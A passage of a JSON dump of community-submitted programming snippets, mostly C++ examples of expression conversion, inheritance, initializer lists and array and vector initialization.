val=STACK.Pop();              out=out+val;         Display(temp,out,STACK);      }     cout<<\"\\n\\nFINAL STRING : \"<<out<<endl;   }\n//Easiet way to solve infix to postfix expression bool isOperator(char c) { \tif(c=='+'||c=='-'||c=='*'||c=='/'||c=='^') \t{ \t\treturn true; \t} \telse \t{ \t\treturn false; \t} }  int precedence(char c)  {      if(c == '^')      return 3;      else if(c == '*' || c == '/')      return 2;      else if(c == '+' || c == '-')      return 1;      else     return -1;  }   string InfixToPostfix(stack<char> s, string infix) { \tstring postfix; \tfor(int i=0;i<infix.length();i++) \t{ \t\tif((infix[i] >= 'a' && infix[i] <= 'z') \t\t||(infix[i] >= 'A' && infix[i] <= 'Z')) \t\t{ \t\t\tpostfix+=infix[i]; \t\t} \t\telse if(infix[i] == '(') \t\t{ \t\t\ts.push(infix[i]); \t\t} \t\telse if(infix[i] == ')') \t\t{ \t\t\twhile((s.top()!='(') && (!s.empty())) \t\t\t{ \t\t\t\tchar temp=s.top(); \t\t\t\tpostfix+=temp; \t\t\t\ts.pop(); \t\t\t} \t\t\tif(s.top()=='(') \t\t\t{ \t\t\t\ts.pop(); \t\t\t} \t\t} \t\telse if(isOperator(infix[i])) \t\t{ \t\t\tif(s.empty()) \t\t\t{ \t\t\t\ts.push(infix[i]); \t\t\t} \t\t\telse \t\t\t{ \t\t\t\tif(precedence(infix[i])>precedence(s.top())) \t\t\t\t{ \t\t\t\t\ts.push(infix[i]); \t\t\t\t}\t \t\t\t\telse if((precedence(infix[i])==precedence(s.top()))&&(infix[i]=='^')) \t\t\t\t{ \t\t\t\t\ts.push(infix[i]); \t\t\t\t} \t\t\t\telse \t\t\t\t{ \t\t\t\t\twhile((!s.empty())&&( precedence(infix[i])<=precedence(s.top()))) \t\t\t\t\t{ \t\t\t\t\t\tpostfix+=s.top(); \t\t\t\t\t\ts.pop(); \t\t\t\t\t} \t\t\t\t\ts.push(infix[i]); \t\t\t\t} \t\t\t} \t\t} \t} \twhile(!s.empty()) \t{ \t\tpostfix+=s.top(); \t\ts.pop(); \t} \t \treturn postfix; }  int main()  {      \tstring infix_exp, postfix_exp;   \tcout<<\"Enter a Infix Expression :\"<<endl;   \tcin>>infix_exp;   \tstack <char> stack; \tcout<<\"INFIX EXPRESSION: \"<<infix_exp<<endl;   \tpostfix_exp = InfixToPostfix(stack, infix_exp);   \tcout<<endl<<\"POSTFIX EXPRESSION: \"<<postfix_exp; \t   \treturn 0; }\n",
    "reg_date": "2021-10-12T11:41:31.000Z"
  },
  {
    "id": 2769,
    "keyword": null,
    "link": null,
    "title": " infix to prefix conversion",
    "description": "#include<bits/stdc++.h> using namespace std;  int prec(char c) {     if(c == '^') {         return 3;     }     else if(c == '*' || c == '/') {         return 2;     }     else if(c == '+' || c =='-') {         return 1;     }     else {         return -1;     } }  //-------------------------------------------------- /* Algorithm - * Suppose your expression is    -> ( a - b/c )*( a/k - l )   -> reverse this expression   -> ) l - k/a (*) c/b - a (   -> reverse the brackets   -> ( l - k/a )*( c/b - a )  * If operand    -> print * If '('    -> push to stack * If ')'    -> pop from stack and print until '(' is found * If operator    -> pop from stack and print until an operator     -> with less or equal(major change here) precedence is found */  string infixToPrefix(string s) {     stack<char> st;     string res;      reverse(s.begin(), s.end());     for (int i = 0; i < s.length(); i++)     {         if(s[i] == '(')           s[i] = ')';         else if(s[i] == ')')           s[i] = '(';     }           for (int i = 0; i < s.length(); i++)     {         if(s[i] == ' ') {             continue;         }         else if((s[i] >= 'a' && s[i] <= 'z') || (s[i] >= 'A' && s[i] <= 'Z')) {             res += s[i];         }         else if(s[i] == '(') {             st.push(s[i]);         }         else if(s[i] == ')') {             while (!st.empty() && st.top() != '(')             {                 res += st.top();                 st.pop();             }             if(!st.empty()) {                 st.pop(); // Popping '(' here             }         }         else {             while (!st.empty() && prec(st.top()) > prec(s[i]))             {                 res += st.top();                 st.pop();             }             st.push(s[i]);         }     }          while (!st.empty())     {        res += st.top();        st.pop();     }          reverse(res.begin(), res.end());     return res; }  int main() {     string exp = \"a*(b-c+d)/e\";     cout<<infixToPrefix(exp);     return 0; }\n",
    "reg_date": "2021-10-12T11:41:31.000Z"
  },
  {
    "id": 2770,
    "keyword": null,
    "link": null,
    "title": " infix to prefix using cpp linked list program",
    "description": "#include <stdio.h>#include <conio.h>#include <string.h>#include <ctype.h>#define MAX 50struct infix{\tchar target[MAX] ;\tchar stack[MAX] ;\tchar *s, *t ;\tint top, l ;} ; void initinfix ( struct infix * ) ;void setexpr ( struct infix *, char * ) ;void push ( struct infix *, char ) ;char pop ( struct infix * ) ;void convert ( struct infix * ) ;int priority ( char c ) ;void show ( struct infix ) ; void main( ){\tstruct infix q ;\tchar expr[MAX] ;\tclrscr( ) ;\tinitinfix ( &q ) ;\tprintf ( \"\\nEnter an expression in infix form: \" ) ;\tgets ( expr ) ;\tsetexpr ( &q, expr ) ;\tconvert ( &q ) ;\tprintf ( \"The Prefix expression is: \" ) ;\tshow ( q ) ;\tgetch( ) ;}/* initializes elements of structure variable */void initinfix ( struct infix *pq ){\tpq -> top = -1 ;\tstrcpy ( pq -> target, \"\" ) ;\tstrcpy ( pq -> stack, \"\" ) ;\tpq -> l = 0 ;}/* reverses the given expression */void setexpr ( struct infix *pq, char *str ){\tpq -> s = str ;\tstrrev ( pq -> s ) ;\tpq -> l = strlen ( pq -> s ) ;\t*( pq -> target + pq -> l ) = '\\0' ;\tpq -> t = pq -> target + ( pq -> l - 1 ) ;}/* adds operator to the stack */void push ( struct infix *pq, char c ){\tif ( pq -> top == MAX - 1 )\t\tprintf ( \"\\nStack is full.\\n\" ) ;\telse\t{\t\tpq -> top++ ;\t\tpq -> stack[pq -> top] = c ;\t}}/* pops an operator from the stack */char pop ( struct infix *pq ){\tif ( pq -> top == -1 )\t{\t\tprintf ( \"Stack is empty\\n\" ) ;\t\treturn -1 ;\t}\telse\t{\t\tchar item = pq -> stack[pq -> top] ;\t\tpq -> top-- ;\t\treturn item ;\t}}/* converts the infix expr. to prefix form */void convert ( struct infix *pq ){\tchar opr ;\twhile ( *( pq -> s ) )\t{\t\tif ( *( pq -> s ) == ' ' || *( pq -> s ) == '\\t' )\t\t{\t\t\tpq -> s++ ;\t\t\tcontinue ;\t\t}\t\tif ( isdigit ( *( pq -> s ) ) || isalpha ( *( pq -> s ) ) )\t\t{\t\t\twhile ( isdigit ( *( pq -> s ) ) || isalpha ( *( pq -> s ) ) )\t\t\t{\t\t\t\t*( pq -> t ) = *( pq -> s ) ;\t\t\t\tpq -> s++ ;\t\t\t\tpq -> t-- ;\t\t\t}\t\t}\t\tif ( *( pq -> s ) == ')' )\t\t{\t\t\tpush ( pq, *( pq -> s ) ) ;\t\t\tpq -> s++ ;\t\t}\t\tif ( *( pq -> s ) == '*' || *( pq -> s ) == '+' || *( pq -> s ) == '/' || *( pq -> s ) == '%' || *( pq -> s ) == '-' || *( pq -> s ) == '$' )\t\t{\t\t\tif ( pq -> top != -1 )\t\t\t{\t\t\t\topr = pop ( pq ) ;\t\t\t\twhile ( priority ( opr ) > priority ( *( pq -> s ) ) )\t\t\t\t{\t\t\t\t\t*( pq -> t ) = opr ;\t\t\t\t\tpq -> t-- ;\t\t\t\t\topr = pop ( pq ) ;\t\t\t\t}\t\t\t\tpush ( pq, opr ) ;\t\t\t\tpush ( pq, *( pq -> s ) ) ;\t\t\t}\t\t\telse\t\t\t\tpush ( pq, *( pq -> s ) ) ;\t\t\t\tpq -> s++ ;\t\t}\t\tif ( *( pq -> s ) == '(' )\t\t{\t\t\topr = pop ( pq ) ;\t\t\twhile ( opr != ')' )\t\t\t{\t\t\t\t*( pq -> t ) = opr ;\t\t\t\tpq -> t-- ;\t\t\t\topr = pop ( pq ) ;\t\t\t}\t\t\tpq -> s++ ;\t\t}\t}\twhile ( pq -> top != -1 )\t{\t\topr = pop ( pq ) ;\t\t*( pq -> t ) = opr ;\t\tpq -> t-- ;\t}\tpq -> t++ ;}/* returns the priotity of the operator */int priority ( char c ){\tif ( c == '$' )\t\treturn 3 ;\tif ( c == '*' || c == '/' || c == '%' )\t\treturn 2 ;\telse\t{\t\tif ( c == '+' || c == '-' )\t\t\treturn 1 ;\t\telse\t\t\treturn 0 ;\t}}/* displays the prefix form of given expr. */void show ( struct infix pq ){\twhile ( *( pq.t ) )\t{\t\tprintf ( \" %c\", *( pq.t ) ) ;\t\tpq.t++ ;\t}}\n",
    "reg_date": "2021-10-12T11:41:31.000Z"
  },
  {
    "id": 2771,
    "keyword": null,
    "link": null,
    "title": " inheritance",
    "description": "it is used to define relationship between two class,  which a child class occurs all the properties and behaviours of a parent class.  Provides code reusability. Ex: in my framework I have a TestBase class which I store  all my reusable code and methods. My test execution classes and  elements classes will extend the TestBase in order to reuse the code.\nclass Employee():   def __init__(self, emp_id, salary):      self.emp_id = emp_id      self.salary = salary  def give_raise(self):      self.salary = self.salary * 1.05\npublic class Bicycle {              // the Bicycle class has three fields     public int cadence;     public int gear;     public int speed;              // the Bicycle class has one constructor     public Bicycle(int startCadence, int startSpeed, int startGear) {         gear = startGear;         cadence = startCadence;         speed = startSpeed;     }              // the Bicycle class has four methods     public void setCadence(int newValue) {         cadence = newValue;     }              public void setGear(int newValue) {         gear = newValue;     }              public void applyBrake(int decrement) {         speed -= decrement;     }              public void speedUp(int increment) {         speed += increment;     }          } \nBuilds relations between classes, main purpose:  create a TEST BASE CLAS and use it in other classes. Inheritance allows a class to inherit properties  (objects, variables, methods) from another source (class or interface).  Allows code reusability and easy to maintain. SUPER CLASS (also known as parent or base class):  is the class where the fields are being inherited from.  SUB CLASS (also known as the child or derived class):  is the class inheriting the properties INHERITANCE EXAMPLE In my framework I have a TestBase class where I store  all my reusable code and methods. My test execution classes,  and elements classes will extend the TestBase in order to reuse the code.  My framework follow POM and some pages have similar actions,  so I can easily use those similar actions and fields  by inheriting them from the ready classes. Example: Base Page Class and Test Base Class.  These 2 class are being inherited from so many different classes.  For Example; In Pages Package, Base Page Class is being extended  by all the class by Base Package. So that Constructor  can be automatically be called in the sub classes.  That way you will be able to locate the elements  by using same driver. Test Base Class can also be inheritance.  One driver, TestNG framework one before method to  setup browser and reuse it every single test class it.  By inheriting them to other test class. These 2 class are  abstract class and meant to be inherited to other classes.  We are not creating any object in these 2 class.  These class is super class. Comes from Selenium library WebDriver,  takes Screenshots, javascriptexecuter these are interface.  List and Set also interface. You cannot create object in interface.  They are only being reference. These are also example for abstraction. \nclass Vehicle {    public Vehicle()   {      System.out.print(\"Default \");    }  }  class Car extends Vehicle {  public Car(String carName) {  System.out.print(carName + \"\");  }  }  public class InheritanceTester {   public static void main(String[] args)    {      Car car=new Car(\"Ford\");   } } \n#include <iostream>  using namespace std;  class Area { \tpublic: \t\tint getArea(int l, int b) \t\t{ \t\t\treturn l * b; \t\t} };  class Perimeter { \tpublic: \t\tint getPerimeter(int l, int b) \t\t{ \t\t\treturn 2*(l + b); \t\t} };  class Rectangle : public Area, public Perimeter { \tint length; \tint breadth; \tpublic: \t\tRectangle() \t\t{ \t\t\tlength = 7; \t\t\tbreadth = 4; \t\t} \t\tint area() \t\t{ \t\t\treturn Area::getArea(length, breadth); \t\t} \t\tint perimeter() \t\t{ \t\t\treturn Perimeter::getPerimeter(length, breadth); \t\t} };  int main() { \tRectangle rt; \tcout << \"Area : \" << rt.area() << endl; \tcout << \"Perimeter : \" << rt.perimeter() << endl; \treturn 0; } \n",
    "reg_date": "2021-10-12T11:41:31.000Z"
  },
  {
    "id": 2772,
    "keyword": null,
    "link": null,
    "title": " inheritance in c++",
    "description": "class base  { \tpublic: \t\tint x; \tprotected: \t\tint y; \tprivate: \t\tint z; };  class publicDerived: public base { \t// x is public \t// y is protected \t// z is not accessible from publicDerived };  class protectedDerived: protected base { \t// x is protected \t// y is protected \t// z is not accessible from protectedDerived };  class privateDerived: private base { \t// x is private \t// y is private \t// z is not accessible from privateDerived } \nInheritance is one of the key features of Object-oriented programming in C++. It allows us to create a new class (derived class) from an existing class (base class).  The derived class inherits the features from the base class and can have additional features of its own.    For example,  class Animal {     // eat() function     // sleep() function };  class Dog : public Animal {     // bark() function }; Here, the Dog class is derived from the Animal class.  Since Dog is derived from Animal, members of Animal are accessible to Dog.  Notice the use of the keyword public while inheriting Dog from Animal.  class Dog : public Animal {...}; We can also use the keywords private and protected instead of public  Example: // C++ program to demonstrate inheritance  #include <iostream> using namespace std;  // base class class Animal {     public:     void eat() {         cout << \"I can eat!\" << endl;     }      void sleep() {         cout << \"I can sleep!\" << endl;     } };  // derived class class Dog : public Animal {      public:     void bark() {         cout << \"I can bark! Woof woof!!\" << endl;     } };  int main() {     // Create object of the Dog class     Dog dog1;      // Calling members of the base class     dog1.eat();     dog1.sleep();      // Calling member of the derived class     dog1.bark();      return 0; } Output  I can eat! I can sleep! I can bark! Woof woof!! Here, dog1 (the object of derived class Dog) can access members of the base class Animal. It's because Dog is inherited from Animal.\n#include <iostream>  // Example in a game we have multiple entities so we put commom functionality and variables in base class Entity and Create Sub Classes Of the base class class Entity { \t//This is a base class of all entities public: \tfloat x =0 , y = 0;//this is the position of entity \tvoid Move(float xa, float ya) { \t\tx += xa; \t\ty += ya; \t\t//this function moves entity \t} }; // in this example Player  inherits from public entity class Player:public Entity// inhertiting From Entity class  { \t// Player class is a Sub class of Entity \t//Player Class ha all the functions and var of public entity + some additional functionality and variables it is a superset of Entity  \t public :  \tconst char* name = nullptr; \tvoid Print() { \t\tstd::cout << name << std::endl; \t} \t//Player class has type of palyer and type of entity \t//Because it has additional method Print and var name \t//We can create entity from palyer because player has everything of entity but we can't create an Entity from player because it has additional things\t }; int main() { \tPlayer D; \tD.x = 5.5f;//initializing inherited variable  \tD.y = 4.4f;//initializing inherited variable  \tD.Move(1.1f,2.2f);//Calling inherited method \tD.name = \"Caleb\";//initializing variable owned by player class  \tD.Print();//calling method owned by Player class \t//Now looking at the size of each class \tstd::cout <<\"Size of Entity was : \" << sizeof(Entity) << std::endl; \tstd::cout <<\"Size of Player was : \"<< sizeof(Player) << std::endl; \t//size of Entity output => 8 \t//size of Player output => 12 \t//because Entity has 2 floats = 4bytes +4 bytes =8 bytes \t//Class Player has 2floats and const char ptr which is 4 bytes for 32 bit application  = (4 +4 + 4)bytes = 12bytes  \t//Note:At the end inheretance is just a way to prevent code duplication \tstd::cin.get(); }\n",
    "reg_date": "2021-10-12T11:41:31.000Z"
  },
  {
    "id": 2773,
    "keyword": null,
    "link": null,
    "title": " inheritance protected  in c++",
    "description": "class base  { \tpublic: \t\tint x; \tprotected: \t\tint y; \tprivate: \t\tint z; };  class publicDerived: public base { \t// x is public \t// y is protected \t// z is not accessible from publicDerived };  class protectedDerived: protected base { \t// x is protected \t// y is protected \t// z is not accessible from protectedDerived };  class privateDerived: private base { \t// x is private \t// y is private \t// z is not accessible from privateDerived } \n",
    "reg_date": "2021-10-12T11:41:31.000Z"
  },
  {
    "id": 2774,
    "keyword": null,
    "link": null,
    "title": " initialisation of a c++ variable",
    "description": "//<Data type> <variable name>; //static initialisation: int acceleration=4; //alternative: int acceleration; acceleration=4; //dynamic \\initialisation: int acceleration; std::cout<<\"Enter the value of the acceleration\\n\"; std::cin>>acceleration; \n",
    "reg_date": "2021-10-12T11:41:32.000Z"
  },
  {
    "id": 2775,
    "keyword": null,
    "link": null,
    "title": " initialise 2d vector in c++",
    "description": "  // Create a vector containing n row and m columns   vector<vector<int> > vec( n , vector<int> (m, 0));  \nvector<vector<int> > vec( n , vector<int> (m, 0));\n// Initializing 2D vector \"vect\" with  // values  vector<vector<int> > vect{ { 1, 2, 3 },                             { 4, 5, 6 },                             { 7, 8, 9 } }; \n",
    "reg_date": "2021-10-12T11:41:32.000Z"
  },
  {
    "id": 2776,
    "keyword": null,
    "link": null,
    "title": " initialising 2d vector",
    "description": "auto M = 4;\t// num of rows auto N = 3; // num of cols in each row auto default_value = 1; // default value of all int elements std::vector<std::vector<int>> matrix(M, std::vector<int>(N, default_value));\n  // Create a vector containing n row and m columns   vector<vector<int> > vec( n , vector<int> (m, 0));  \n// Initializing 2D vector \"vect\" with  // values  vector<vector<int> > vect{ { 1, 2, 3 },                             { 4, 5, 6 },                             { 7, 8, 9 } }; \n",
    "reg_date": "2021-10-12T11:41:32.000Z"
  },
  {
    "id": 2777,
    "keyword": null,
    "link": null,
    "title": " initialization list c++",
    "description": "struct S {     int n;     S(int); // constructor declaration     S() : n(7) {} // constructor definition.                   // \": n(7)\" is the initializer list };  S::S(int x) : n{x} {} // constructor definition. \": n{x}\" is the initializer list  int main() {     S s; // calls S::S()     S s2(10); // calls S::S(int) }\n#include <iostream> class Entity { private :  \tstd::string m_Name; \tint m_Score; \tint x, y, z; public: \tEntity() \t\t:m_Name(\"[Unknown]\"),m_Score(0),x(0),y(0),z(0)//initialize in the order of how var are declared \t{ \t} \tEntity (const std::string& name)  \t\t:m_Name(name) \t{} \tconst std::string& GetName() const { return m_Name; }; }; int main() { \tEntity e1; \tstd::cout << e1.GetName() << std::endl; \tEntity e2(\"Caleb\"); \tstd::cout << e2.GetName() << std::endl; \tstd::cin.get(); }\nclass Something { private:     int m_value1;     double m_value2;     char m_value3;   public:     Something()     {         // These are all assignments, not initializations         m_value1 = 1;         m_value2 = 2.2;         m_value3 = 'c';     } }; \nclass Example { public: \tint m_A, m_B, m_C; \tExample(int a, int b, int c); };  Example::Example(int a, int b, int c): \t// This is an initializer list \tm_A(a), \tm_B(b), \tm_C(c) { /* Constructor code */ } \t\n",
    "reg_date": "2021-10-12T11:41:32.000Z"
  },
  {
    "id": 2778,
    "keyword": null,
    "link": null,
    "title": " initialize 2D vector",
    "description": "auto M = 4;\t// num of rows auto N = 3; // num of cols in each row auto default_value = 1; // default value of all int elements std::vector<std::vector<int>> matrix(M, std::vector<int>(N, default_value));\nvector<vector<int> > vec( n , vector<int> (m, 0));\n// Initializing 2D vector \"vect\" with  // values  vector<vector<int> > vect{ { 1, 2, 3 },                             { 4, 5, 6 },                             { 7, 8, 9 } }; \nvector<vector<int> >    v2(8, vector<int>(5)); \nstd::vector<vector<int>> d; //std::vector<int> d; cout<<\"Enter the N number of ship and port:\"<<endl; cin>>in; cout<<\"\\Enter preference etc..:\\n\"; for(i=0; i<in; i++){  cout<<\"ship\"<<i+1<<\":\"<<' ';     for(j=0; j<in; j++){     cin>>temp;     d.push_back(temp);// I don't know how to push_back here!!     } }\n",
    "reg_date": "2021-10-12T11:41:32.000Z"
  },
  {
    "id": 2779,
    "keyword": null,
    "link": null,
    "title": " initialize 2d array c++",
    "description": "int nums[2][3]  =  { {16, 18, 20}, {25, 26, 27} };\nint** arr = new int*[10]; // Number of Students int i=0, j; for (i; i<10; i++)  \tarr[i] = new int[5]; // Number of Courses /*In line[1], you're creating an array which can store the addresses   of 10 arrays. In line[4], you're allocating memories for the    array addresses you've stored in the array 'arr'. So it comes out    to be a 10 x 5 array. */\n// Initializing 2D vector \"vect\" with  // values  vector<vector<int> > vect{ { 1, 2, 3 },                             { 4, 5, 6 },                             { 7, 8, 9 } }; \nint main() {     int arr[2][5] =     {         {1,8,12,20,25},         {5,9,13,24,26}     }; } \nvoid printMatrix(array<array<int, COLS>, ROWS> matrix){ for (auto row : matrix){ //auto infers that row is of type array<int, COLS> for (auto element : row){ cout << element << ' '; } cout << endl; }\n#include <array> 2 #include <iostream> 3 4 using namespace std; 5 6 //remember const! 7 const int ROWS = 2; 8 const int COLS = 3;   int main(){  array<array<int, COLS>, ROWS> matrix = {  1, 2, 3,  4, 5, 6  };         return 0; }\n",
    "reg_date": "2021-10-12T11:41:32.000Z"
  },
  {
    "id": 2780,
    "keyword": null,
    "link": null,
    "title": " initialize 2d array c++ memset",
    "description": "int arr[10][20] = {0};  // easier way // this does the same memset(arr, 0, sizeof arr);  \n",
    "reg_date": "2021-10-12T11:41:32.000Z"
  },
  {
    "id": 2781,
    "keyword": null,
    "link": null,
    "title": " initialize 2d vector of ints c++",
    "description": "auto M = 4;\t// num of rows auto N = 3; // num of cols in each row auto default_value = 1; // default value of all int elements std::vector<std::vector<int>> matrix(M, std::vector<int>(N, default_value));\n",
    "reg_date": "2021-10-12T11:41:32.000Z"
  },
  {
    "id": 2782,
    "keyword": null,
    "link": null,
    "title": " initialize 3d vector c++",
    "description": "vector<vector<vector<int>>> dp(n+1,vector<vector<int>>(n+1,vector<int>(n+1,-1)));\nvector<vector<vector<double>>> f(3, vector<vector<double>>(4, vector<double>(5)));\nvector<vector<vector<double>>> f(3, vector<vector<double>>(4, vector<double>(5))); \n// CPP program to create an empty vector // and push values one by one. #include <bits/stdc++.h> using namespace std;  int main() { \tint n = 3;  \t// Create a vector of size n with \t// all values as 10. \tvector<int> vect(n, 10);  \tfor (int x : vect) \t\tcout << x << \" \";  \treturn 0; } \n",
    "reg_date": "2021-10-12T11:41:32.000Z"
  },
  {
    "id": 2783,
    "keyword": null,
    "link": null,
    "title": " initialize a vector with another vector c++ complexity",
    "description": "vector<int> vect2(vect1.begin(), vect1.end());\n",
    "reg_date": "2021-10-12T11:41:33.000Z"
  },
  {
    "id": 2784,
    "keyword": null,
    "link": null,
    "title": " initialize all elements of vector to 0 c++",
    "description": "// CPP program to create an empty vector  // and push values one by one.  #include <vector>  using namespace std; int main()  {      // Create an empty vector      vector<int> vect;       //add/push an integer to the end of the vector     vect.push_back(10);  \t//to traverse and print the vector from start to finish     for (int x : vect)          cout << x << \" \";      return 0;  }\n vector<int> vect1(10); //number of elements in vector     int value = 0;     fill(vect1.begin(), vect1.end(), value);\n// Create a vector of size n with     // all values as 10.     vector<int> vect(n, 10);\n vector<int> arr(10,0);\n",
    "reg_date": "2021-10-12T11:41:33.000Z"
  },
  {
    "id": 2785,
    "keyword": null,
    "link": null,
    "title": " initialize an array in c++",
    "description": "int nums[100] = {0}; // initiallize all values to 0  int nums[5] = {1,2,3,4,5};  // type name[size] = {values};\nint nCount[] = {1, 2, 3, 4, 5};\nint arr[3] = {1, 5, 4};\n",
    "reg_date": "2021-10-12T11:41:33.000Z"
  },
  {
    "id": 2786,
    "keyword": null,
    "link": null,
    "title": " initialize array c++",
    "description": "int* a = NULL;   // Pointer to int, initialize to nothing. int n;           // Size needed for array cin >> n;        // Read in the size a = new int[n];  // Allocate n ints and save ptr in a. for (int i=0; i<n; i++) {     a[i] = 0;    // Initialize all elements to zero. } . . .  // Use a as a normal array delete [] a;  // When done, free memory pointed to by a. a = NULL;     // Clear a to prevent using invalid memory reference. \nint nums[100] = {0}; // initiallize all values to 0  int nums[5] = {1,2,3,4,5};  // type name[size] = {values};\nint foo [] = { 16, 2, 77, 40, 12071 };\nint nCount[] = {1, 2, 3, 4, 5};\nint foo [5];\nint arr[3] = {1, 5, 4};\n",
    "reg_date": "2021-10-12T11:41:33.000Z"
  },
  {
    "id": 2787,
    "keyword": null,
    "link": null,
    "title": " initialize dynamic array c++ to 0",
    "description": "int *arrayName = new int[10]{0};  //Print array elements for(int i=0; i<10; i++ { cout<<arrayName[i] <<\" \"; }\n",
    "reg_date": "2021-10-12T11:41:33.000Z"
  },
  {
    "id": 2788,
    "keyword": null,
    "link": null,
    "title": " initialize int c++",
    "description": "// operating with variables  #include <iostream> using namespace std;  int main () {   // declaring variables:   int a, b;   int result;    // process:   a = 5;   b = 2;   a = a + 1;   result = a - b;    // print out the result:   cout << result;    // terminate the program:   return 0; }\n",
    "reg_date": "2021-10-12T11:41:33.000Z"
  },
  {
    "id": 2789,
    "keyword": null,
    "link": null,
    "title": " initialize many variablles c++",
    "description": "int column = 0, row = 0, index = 0; \n",
    "reg_date": "2021-10-12T11:41:33.000Z"
  },
  {
    "id": 2790,
    "keyword": null,
    "link": null,
    "title": " initialize map c++",
    "description": "std::map<std::string,std::string> my_map = {   {\"key1\",\"value1\"},   {\"key2\",\"value2\"} };\nstd::map<std::string, int> mapOfMarks = { \t\t{\"Riti\",2}, \t\t{\"Jack\",4} };\n",
    "reg_date": "2021-10-12T11:41:33.000Z"
  },
  {
    "id": 2791,
    "keyword": null,
    "link": null,
    "title": " initialize string with length c++",
    "description": "string word(length,' ');\n",
    "reg_date": "2021-10-12T11:41:33.000Z"
  },
  {
    "id": 2792,
    "keyword": null,
    "link": null,
    "title": " initialize variable in switch case c++",
    "description": "switch (n) {     case 1: // code to be executed if n = 1;         break;     case 2: // code to be executed if n = 2;         break;     default: // code to be executed if n doesn't match any cases }\n#include <iostream> using namespace std; int main(){    int num = 5;    switch(num + 2) {       case 1:          cout << \"Case1: Value is: \" << num << endl;       case 2:          cout << \"Case2: Value is: \" << num << endl;       case 3:          cout << \"Case3: Value is: \" << num << endl;       default:          cout << \"Default: Value is: \" << num << endl;    }    return 0; }\nswitch (val) {    case VAL:   {   // This will work   int newVal = 42;     break; } case ANOTHER_VAL:   ... break; } \n",
    "reg_date": "2021-10-12T11:41:33.000Z"
  },
  {
    "id": 2793,
    "keyword": null,
    "link": null,
    "title": " initialize vector c++",
    "description": "vector<vector<vector<double>>> f(3, vector<vector<double>>(4, vector<double>(5)));\n// CPP program to create an empty vector  // and push values one by one.  #include <vector>  using namespace std; int main()  {      // Create an empty vector      vector<int> vect;       //add/push an integer to the end of the vector     vect.push_back(10);  \t//to traverse and print the vector from start to finish     for (int x : vect)          cout << x << \" \";      return 0;  }\n// First include the vector library: #include <vector>  // The syntax to create a vector looks like this: std::vector<type> name;  // We can create & initialize \"lol\" vector with specific values: std::vector<double> lol = {66.666, -420.69};  // it would look like this: 66.666 | -420.69\n vector<int> arr(10,0);\n#include <iostream> #include <vector>   #define M 3 #define N 4   int main() {   // specify default value to fill the vector elements   int default_value = 1;   // first initialize a vector of ints with given default value   std::vector<int> v(N, default_value);   // Use above vector to initialize the two-dimensional vector   std::vector<std::vector<int>> matrix(M, v);      return 0; } \n// CPP program to create an empty vector // and push values one by one. #include <bits/stdc++.h> using namespace std;  int main() { \tint n = 3;  \t// Create a vector of size n with \t// all values as 10. \tvector<int> vect(n, 10);  \tfor (int x : vect) \t\tcout << x << \" \";  \treturn 0; } \n",
    "reg_date": "2021-10-12T11:41:34.000Z"
  },
  {
    "id": 2794,
    "keyword": null,
    "link": null,
    "title": " initialize vector of pointers c++",
    "description": "std::vector<int*> stuff;\n",
    "reg_date": "2021-10-12T11:41:34.000Z"
  },
  {
    "id": 2795,
    "keyword": null,
    "link": null,
    "title": " initialize vector of vector c++",
    "description": "#include <iostream> #include <vector>   #define M 3 #define N 4   int main() {   // specify default value to fill the vector elements   int default_value = 1;   // first initialize a vector of ints with given default value   std::vector<int> v(N, default_value);   // Use above vector to initialize the two-dimensional vector   std::vector<std::vector<int>> matrix(M, v);      return 0; } \n// Initializing 2D vector \"vect\" with  // values  vector<vector<int> > vect{ { 1, 2, 3 },                             { 4, 5, 6 },                             { 7, 8, 9 } }; \n#include <bits/stdc++.h>  #include <vector>  using namespace std;     int main()  {  // This vector initializes with the values: 10, 20, and 30   vector<int> vect{ 10, 20, 30 };       return 0;  } \nvector<int> vect{ 10, 20, 30 };\nvector<int> a;                                       // empty vector of ints vector<int> b (5, 10);                                // five ints with value 10 vector<int> c (b.begin(),b.end());                     // iterating through second vector<int> d (c);                                   // copy of c\n",
    "reg_date": "2021-10-12T11:41:34.000Z"
  },
  {
    "id": 2796,
    "keyword": null,
    "link": null,
    "title": " initialize vector to all zeros c++",
    "description": "// my linkedin : https://www.linkedin.com/in/vaalarivan-prasanna-3a07bb203/ // 1-D case vector<int> vec(desiredVectorSize, 0);    // 2-D case vector<vector<int>> vec(desiredNoOfRows, vector<int>(desiredNoOfColumns, 0)); \n",
    "reg_date": "2021-10-12T11:41:34.000Z"
  },
  {
    "id": 2797,
    "keyword": null,
    "link": null,
    "title": " initialize whole array to 0 c++",
    "description": "std::vector<int> arr(SIZE); for (int i = 0; i < SIZE; i++) {     arr[i] = i; } \nint *arrayName = new int[10]{0};  //Print array elements for(int i=0; i<10; i++ { cout<<arrayName[i] <<\" \"; }\nint nScores[100] = {0};\n",
    "reg_date": "2021-10-12T11:41:34.000Z"
  },
  {
    "id": 2798,
    "keyword": null,
    "link": null,
    "title": " initializer list c++",
    "description": "// Constructor Member Initializer List  #include <iostream>  class Example { private:     int x, y;  public:     Example() : x(0), y(0) {}     Example(int x1, int y1) : x(x1), y(y1) {}     ~Example() {} };  int main() {     Example e; }\nstruct S {     int n;     S(int); // constructor declaration     S() : n(7) {} // constructor definition.                   // \": n(7)\" is the initializer list };  S::S(int x) : n{x} {} // constructor definition. \": n{x}\" is the initializer list  int main() {     S s; // calls S::S()     S s2(10); // calls S::S(int) }\n#include <iostream> class Entity { private :  \tstd::string m_Name; \tint m_Score; \tint x, y, z; public: \tEntity() \t\t:m_Name(\"[Unknown]\"),m_Score(0),x(0),y(0),z(0)//initialize in the order of how var are declared \t{ \t} \tEntity (const std::string& name)  \t\t:m_Name(name) \t{} \tconst std::string& GetName() const { return m_Name; }; }; int main() { \tEntity e1; \tstd::cout << e1.GetName() << std::endl; \tEntity e2(\"Caleb\"); \tstd::cout << e2.GetName() << std::endl; \tstd::cin.get(); }\nclass Example { public: \tint m_A, m_B, m_C; \tExample(int a, int b, int c); };  Example::Example(int a, int b, int c): \t// This is an initializer list \tm_A(a), \tm_B(b), \tm_C(c) { /* Constructor code */ } \t\nclass Something { private:     int m_value1;     double m_value2;     char m_value3;   public:     Something()     {         // These are all assignments, not initializations         m_value1 = 1;         m_value2 = 2.2;         m_value3 = 'c';     } }; \n",
    "reg_date": "2021-10-12T11:41:34.000Z"
  },
  {
    "id": 2799,
    "keyword": null,
    "link": null,
    "title": " initializing 2d vector",
    "description": "vector<vector<int> > vec( n , vector<int> (m, 0));\n",
    "reg_date": "2021-10-12T11:41:34.000Z"
  },
  {
    "id": 2800,
    "keyword": null,
    "link": null,
